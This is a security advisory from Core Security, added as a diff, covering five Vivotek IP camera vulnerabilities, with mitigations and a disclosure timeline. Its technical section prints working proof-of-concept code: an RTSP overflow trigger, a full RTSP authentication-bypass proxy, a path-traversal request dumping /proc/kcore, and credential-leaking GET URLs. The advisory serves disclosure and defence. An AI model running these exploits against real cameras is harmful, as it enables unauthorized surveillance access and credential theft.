@@ -1,0 +1,471 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com
+
+Vivotek IP Cameras Multiple Vulnerabilities
+
+
+1. *Advisory Information*
+
+Title: Vivotek IP Cameras Multiple Vulnerabilities
+Advisory ID: CORE-2013-0301
+Advisory URL:
+http://www.coresecurity.com/advisories/vivotek-ip-cameras-multiple-vulnerabilities
+Date published: 2013-04-29
+Date of last update: 2013-04-29
+Vendors contacted: Vivotek
+Release mode: User release
+
+2. *Vulnerability Information*
+
+Class: Information leak through GET request [CWE-598], Buffer overflow
+[CWE-119], Authentication issues [CWE-287], Path traversal [CWE-22], OS
+command injection [CWE-78]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597,
+CVE-2013-1598
+
+3. *Vulnerability Description*
+
+Multiple vulnerabilities have been found in Vivotek IP cameras [1] (and
+potentially cameras from other vendors sharing the affected firmware)
+that could allow an unauthenticated remote attacker:
+
+   1. [CVE-2013-1594] to process GET requests that contain sensitive
+information,
+   2. [CVE-2013-1595] to execute arbitrary code,
+   3. [CVE-2013-1596] to access the video stream via RTSP,
+   4. [CVE-2013-1597] to dump the camera's memory and retrieve user
+credentials,
+   5. [CVE-2013-1598] to execute arbitrary commands from the
+administration web interface (pre-authentication with firmware 0300a and
+post-authentication with firmware 0400a).
+
+4. *Vulnerable Packages*
+
+   . Vivotek PT7135 IP camera with firmware 0300a.
+   . Vivotek PT7135 IP camera with firmware 0400a.
+   . Other Vivotek cameras/firmware are probably affected too, but they
+were not checked.
+
+5. *Non-Vulnerable Packages*
+
+Vendor did not provide details. Contact Vivotek for further information.
+
+6. *Vendor Information, Solutions and Workarounds*
+
+There was no official answer from Vivotek after several attempts to
+report these vulnerabilities (see [Sec. 9]). Contact vendor for further
+information.
+
+Some mitigation actions may be:
+
+   . Do not expose the camera to internet unless absolutely necessary.
+   . Filter RTSP traffic (default port 554) if possible.
+   . Have at least one proxy filtering '/../../' and 'getparam.cgi' in
+HTTP requests.
+   . Filter strings in the parameter 'system.ntp' on every request made
+to the binary 'farseer.out'.
+
+7. *Credits*
+
+[CVE-2013-1594] was originally discovered and reported [2] by Alejandro
+Leon Morales [3] and re-discovered on new firmware versions by Flavio De
+Cristofaro from Core Security.
+
+[CVE-2013-1595] and [CVE-2013-1596] were discovered and researched by
+Martin Rocha from Core Impact Pro Team. The PoC of [CVE-2013-1596] was
+made by Martin Rocha with help of Juan Cotta from Core QA Team.
+
+[CVE-2013-1597] and [CVE-2013-1598] were discovered and researched by
+Francisco Falcon and Nahuel Riva from Core Exploit Writers Team.
+
+The publication of this advisory was coordinated by Fernando Miranda
+from Core Advisories Team.
+
+8. *Technical Description / Proof of Concept Code*
+
+8.1. *Information leak through GET request*
+
+[CVE-2013-1594] Several Vivotek cameras store Wireless keys and 3rd
+party credentials in clear text allowing a remote attacker to obtain
+sensitive information which might be valuable to perform further
+attacks. Sensitive information stored in plain text includes:
+
+   . FTP credentials
+   . Share folder credentials
+   . SMTP credentials
+   . WEP / WPA Keys
+   . DynDNS credentials
+   . Safe100.net credentials
+   . TZO credentials, among others.
+The following GET requests can exploit the vulnerability (requests may
+change according to firmware versions and vendors devices):
+
+/-----
+http://192.168.1.100/cgi-bin/admin/getparam.cgi
+
+http://192.168.1.100/setup/parafile.html
+-----/
+
+
+8.2. *Remote Buffer Overflow*
+
+[CVE-2013-1595] The following Python script can be used to trigger the
+vulnerability. This script will send to the RTSP service a specially
+crafted packet with the header field 'Authorization' fully completed
+with the character 'a' (0x61). As a result, the Instruction Pointer
+register (IP) will be overwritten with 0x61616161, which is a typical
+buffer overrun condition.
+
+/-----
+import socket, base64
+
+cam_ip = '192.168.1.100'
+session_descriptor = 'live.sdp'
+
+request = 'DESCRIBE rtsp://%s/%s RTSP/1.0\r\n' % (cam_ip,
+session_descriptor)
+request+= 'CSeq: 1\r\n'
+request+= 'Authorization: Basic %s\r\n'
+request+= '\r\n'
+
+auth_little = 'a' * 1000
+auth_big = 'a' * 10000
+
+msgs = [request % auth_little, request % auth_big]
+
+for msg in msgs:
+    s = socket.socket()
+    s.connect((cam_ip, 554))
+    print s.send(msg)
+    print s.recv(0x10000)
+    s.close()
+
+-----/
+
+
+8.3. *RTSP Authentication Bypass*
+
+[CVE-2013-1596] This vulnerability is triggered by sending specially
+crafted RTSP packets to remote TCP port 554 of a Vivotek PT7135 camera.
+As a result, the video stream can be accessed by an unauthenticated
+remote attacker.
+
+/-----
+import sys
+from socket import *
+from threading import Thread
+import time, re
+
+LOGGING = 1
+
+def log(s):
+    if LOGGING:
+        print '(%s) %s' % (time.ctime(), s)
+
+class UDPRequestHandler(Thread):
+    def __init__(self, data_to_send, recv_addr, dst_addr):
+        Thread.__init__(self)
+        self.data_to_send = data_to_send
+        self.recv_addr = recv_addr
+        self.dst_addr = dst_addr
+    
+    def run(self):
+        sender = socket(AF_INET, SOCK_DGRAM)
+        sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        sender.sendto(self.data_to_send, self.dst_addr)
+        response = sender.recv(1024)
+        sender.sendto(response, self.recv_addr)
+        sender.close()
+
+
+class UDPDispatcher(Thread):
+    dispatchers = []
+    
+    def __has_dispatcher_for(self, port):
+        return any([d.src_port == port for d in UDPDispatcher.dispatchers])
+    
+    def __init__(self, src_port, dst_addr):
+        Thread.__init__(self)
+        if self.__has_dispatcher_for(src_port):
+            raise Exception('There is already a dispatcher for port %d'
+% src_port)
+        self.src_port = src_port
+        self.dst_addr = dst_addr
+        UDPDispatcher.dispatchers.append(self)
+    
+    def run(self):
+        listener = socket(AF_INET, SOCK_DGRAM)
+        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        listener.bind(('', self.src_port))
+        while 1:
+            try:
+                data, recv_addr = listener.recvfrom(1024)
+                if not data: break
+                UDPRequestHandler(data, recv_addr, self.dst_addr).start()
+            except Exception as e:
+                print e
+                break        
+        listener.close()
+        UDPDispatcher.dispatchers.remove( self )
+
+
+class PipeThread(Thread):
+    pipes = []
+    def __init__(self, source, sink, process_data_callback=lambda x: x):
+        Thread.__init__(self)
+        self.source = source
+        self.sink = sink
+        self.process_data_callback = process_data_callback
+        PipeThread.pipes.append(self)
+
+    def run(self):
+        while 1:
+            try:
+                data = self.source.recv(1024)
+                data = self.process_data_callback(data)
+                if not data: break
+                self.sink.send( data )
+            except Exception as e:
+                log(e)
+                break
+        PipeThread.pipes.remove(self)
+
+
+class TCPTunnel(Thread):
+    def __init__(self, src_port, dst_addr, process_data_callback=lambda
+x: x):
+        Thread.__init__(self)
+        log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
+dst_addr[0], dst_addr[1]))
+        self.dst_addr = dst_addr
+        self.process_data_callback = process_data_callback
+        # Create TCP listener socket
+        self.sock = socket(AF_INET, SOCK_STREAM)
+        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        self.sock.bind(('', src_port))
+        self.sock.listen(5)
+    
+    def run(self):
+        while 1:
+            # Wait until a new connection arises
+            newsock, address = self.sock.accept()
+            # Create forwarder socket
+            fwd = socket(AF_INET, SOCK_STREAM)
+            fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            fwd.connect(self.dst_addr)
+            # Pipe them!
+            PipeThread(newsock, fwd, self.process_data_callback).start()
+            PipeThread(fwd, newsock, self.process_data_callback).start()
+
+
+class Camera():
+    def __init__(self, address):
+        self.address = address
+    def get_describe_data(self):
+        return ''
+
+
+class Vivotek(Camera):
+    # Vivotek PT7135/0400a
+    def __init__(self, address):
+        Camera.__init__(self, address)
+    def get_describe_data(self):
+        return 'v=0\r\no=RTSP 836244 0 IN IP4 0.0.0.0\r\ns=RTSP
+server\r\nc=IN IP4 0.0.0.0\r\nt=0
+0\r\na=charset:Shift_JIS\r\na=range:npt=0-\r\na=control:*\r\na=etag:1234567890\r\nm=video
+0 RTP/AVP 96\r\nb=AS:1200\r\na=rtpmap:96
+MP4V-ES/30000\r\na=control:trackID=1\r\na=fmtp:96
+profile-level-id=3;config=000001B003000001B509000001000000012000C48881F4514043C1463F;decode_buf=76800\r\nm=audio
+0 RTP/AVP 97\r\na=control:trackID=3\r\na=rtpmap:97
+mpeg4-generic/16000/2\r\na=fmtp:97 streamtype=5; profile-level-id=15;
+mode=AAC-hbr; config=1410;SizeLength=13; IndexLength=3;
+IndexDeltaLength=3; CTSDeltaLength=0; DTSDeltaLength=0;\r\n'
+
+
+class RTSPAuthByPasser():
+    DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
+    UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
+    SERVER_PORT_ARGUMENTS = 'server_port='
+    DEFAULT_CSEQ = 1
+    DEFAULT_SERVER_PORT_RANGE = '5556-5559'
+
+    def __init__(self, local_port, camera):
+        self.last_describe_req = ''
+        self.camera = camera
+        self.local_port = local_port
+        
+    def start(self):
+        log('[!] Starting bypasser')
+        TCPTunnel(self.local_port, self.camera.address,
+self.spoof_rtsp_conn).start()
+        
+    def spoof_rtsp_conn(self, data):
+        if RTSPAuthByPasser.DESCRIBE_REQ_HEADER in data:
+            self.last_describe_req = data
+        elif RTSPAuthByPasser.UNAUTHORIZED_RESPONSE in data and
+self.last_describe_req:
+            log('[!] Unauthorized response received. Spoofing...')
+            spoofed_describe = self.camera.get_describe_data()
+            # Look for the request CSeq
+            m = re.search('.*CSeq:\\s*(\\d+?)\r\n.*',
+self.last_describe_req)
+            cseq = m.group(1) if m else RTSPAuthByPasser.DEFAULT_CSEQ
+            # Create the response
+            data = 'RTSP/1.0 200 OK\r\n'
+            data+= 'CSeq: %s\r\n' % cseq
+            data+= 'Content-Type: application/sdp\r\n'
+            data+= 'Content-Length: %d\r\n' % len(spoofed_describe)
+            data+= '\r\n'
+            # Attach the spoofed describe
+            data+= spoofed_describe       
+        elif RTSPAuthByPasser.SERVER_PORT_ARGUMENTS in data:
+            # Look for the server RTP ports
+            m = re.search('.*%s\\s*(.+?)[;|\r].*' %
+RTSPAuthByPasser.SERVER_PORT_ARGUMENTS, data)
+            ports = m.group(1) if m else
+RTSPAuthByPasser.DEFAULT_SERVER_PORT_RANGE
+            # For each port in the range create a UDP dispatcher
+            begin_port, end_port = map(int, ports.split('-'))
+            for udp_port in xrange(begin_port, end_port + 1):
+                try:
+                    UDPDispatcher(udp_port, (self.camera.address[0],
+udp_port)).start()
+                except:
+                    pass        
+        return data
+
+if __name__ == '__main__':
+    if len( sys.argv ) > 1:
+        listener_port = camera_port = int(sys.argv[1])
+        camera_ip = sys.argv[2]
+        if len(sys.argv) == 4:
+            camera_port = int(sys.argv[3])
+        RTSPAuthByPasser(listener_port, Vivotek((camera_ip,
+camera_port))).start()
+    else:
+        print 'usage: python %s [local_port] [camera_ip]
+[camera_rtsp_port]'   
+
+-----/
+
+
+8.4. *User Credentials Leaked via Path Traversal*
+
+[CVE-2013-1597] The following Python code exploits a path traversal and
+dumps the camera's memory. Valid user credentials can be extracted from
+this memory dump by an unauthenticated remote attacker (firmware 0300a).
+The same attack is still valid with firmware 0400a but the user has to
+be authenticated in order to exploit this flaw.
+
+/-----
+import httplib
+
+conn = httplib.HTTPConnection("192.168.1.100")
+conn.request("GET", "/../../../../../../../../../proc/kcore")
+resp = conn.getresponse()
+data = resp.read()
+-----/
+
+
+
+8.5. *OS Command Injection*
+
+[CVE-2013-1598] The command injection is located in the binary file
+'farseer.out' in the parameter 'system.ntp':
+
+/-----
+.text:0000CB34                 MOV     R1, R4
+.text:0000CB38                 LDR     R0, =aCmdporcessStar ;
+"[CmdPorcess] Start sync with NTP server %s"...
+.text:0000CB3C                 ADD     R10, SP, #0x144+var_120
+.text:0000CB40                 BNE     loc_CB68
+[...]
+.text:0000CB68                 BL      .printf
+.text:0000CB6C                 LDR     R2, =aSS_0      ; "%s%s"
+.text:0000CB70                 LDR     R3, =aUsrSbinPsntpda ;
+"/usr/sbin/psntpdate -4fr "
+.text:0000CB74                 MOV     R1, #0xFF       ; maxlen
+.text:0000CB78                 MOV     R0, R10         ; s
+.text:0000CB7C                 STR     R4, [SP,#0x144+var_144]
+.text:0000CB80                 BL      .snprintf
+.text:0000CB84                 MOV     R0, R10         ; command
+.text:0000CB88                 BL      .system        
+-----/
+
+9. *Report Timeline*
+
+. 2013-03-06:
+Core Security Technologies notifies the Vivotek Customer Support of the
+vulnerability (tracking ID CRM:00930113) and requests a security manager
+to send a draft report regarding these vulnerabilities. No reply received.
+
+. 2013-03-11:
+Core asks for a security manager to send a confidential report.
+
+. 2013-03-14:
+Core notifies the Vivotek Technical Support of the vulnerability
+(tracking ID CRM:00930485).
+
+. 2013-03-18:
+Core opens a new ticket in the Vivotek Technical Support (tracking ID
+CRM:00930670).
+
+. 2013-03-21:
+Core asks for a reply regarding the tracking ID CRM:00930485.
+
+. 2013-04-24:
+Core tries to contact vendor for last time without any reply.
+
+. 2013-04-29:
+After 6 failed attempts to report the issues, the advisory
+CORE-2013-0301 is published as 'user-release'.
+
+10. *References*
+
+[1] http://www.vivotek.com/web/product/NetworkCameras.aspx
+[2] http://www.securityfocus.com/bid/54476.
+[3] Alejandro Leon Morales [Gothicx] http://www.undermx.blogspot.mx.
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2012 Core Security
+Technologies and (c) 2012 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
